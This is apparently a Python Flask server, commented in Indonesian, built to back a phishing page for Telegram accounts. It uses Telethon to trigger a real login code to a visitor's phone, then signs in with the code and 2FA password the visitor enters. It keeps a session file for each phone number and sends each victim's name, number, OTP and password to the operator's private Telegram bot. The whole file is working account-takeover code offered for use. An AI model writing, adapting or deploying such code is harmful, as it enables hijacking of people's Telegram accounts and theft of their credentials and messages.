import os
import asyncio
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from telethon import TelegramClient, errors
from asgiref.sync import async_to_sync

app = Flask(__name__)
# Mengizinkan akses dari frontend Netlify kamu
CORS(app, resources={r"/*": {"origins": "*"}})

# Ambil variabel dari dashboard Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Penyimpanan session sementara agar tidak tertukar antar user
sessions = {}

def send_bot(message):
    """Mengirim laporan ke Telegram pribadi kamu"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Error Bot: {e}")

async def handle_register_logic(data):
    """Logika utama Telethon untuk validasi real-time"""
    step = data.get('step')
    nomor = data.get('nomor')
    otp = data.get('otp')
    sandi = data.get('sandi')
    nama = data.get('nama', 'None')

    # Gunakan file session unik berdasarkan nomor HP
    session_path = f"session_{nomor}"
    client = TelegramClient(session_path, int(API_ID), API_HASH)

    try:
        await client.connect()

        # STEP 1: Kirim OTP asli dari Telegram ke HP User
        if step == 1:
            try:
                sent_code = await client.send_code_request(nomor)
                sessions[nomor] = sent_code.phone_code_hash
                send_bot(f"📲 *Mencoba Login*\nName: {nama}\nNumber: {nomor}")
                return {"status": "success", "message": "OTP Sent"}, 200
            except Exception as e:
                return {"status": "error", "message": str(e)}, 400

        # STEP 2: Verifikasi OTP (Cek Benar/Salah)
        elif step == 2:
            phone_code_hash = sessions.get(nomor)
            if not phone_code_hash:
                return {"status": "error", "message": "Sesi kadaluarsa, ulangi lagi"}, 400
            
            try:
                await client.sign_in(nomor, otp, phone_code_hash=phone_code_hash)
                send_bot(f"✅ *Login Berhasil!*\nName: {nama}\nNumber: {nomor}\nOTP: {otp}")
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                # OTP Benar, tapi butuh Sandi 2FA
                return {"status": "need_2fa"}, 200
            except errors.PhoneCodeInvalidError:
                # OTP Salah
                return {"status": "error", "message": "Kode OTP Salah!"}, 400

        # STEP 3: Verifikasi Sandi 2FA (Cek Benar/Salah)
        elif step == 3:
            try:
                await client.sign_in(password=sandi)
                send_bot(f"✅ *Login Berhasil (2FA)!*\nName: {nama}\nNumber: {nomor}\nPassword: {sandi}")
                return {"status": "success"}, 200
            except errors.PasswordHashInvalidError:
                # Sandi 2FA Salah
                return {"status": "error", "message": "Sandi 2FA Salah!"}, 400

    except Exception as e:
        return {"status": "error", "message": str(e)}, 500
    finally:
        await client.disconnect()

@app.route('/register', methods=['POST'])
def register():
    """Jembatan Flask ke Telethon menggunakan async_to_sync"""
    data = request.json
    try:
        # Menjalankan logika async secara sinkron agar tidak error ASGI
        result, status_code = async_to_sync(handle_register_logic)(data)
        return jsonify(result), status_code
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    # Menjalankan server pada port yang ditentukan Railway
    port = int(os.getenv("PORT", 5000))
    app.run(host='0.0.0.0', port=port)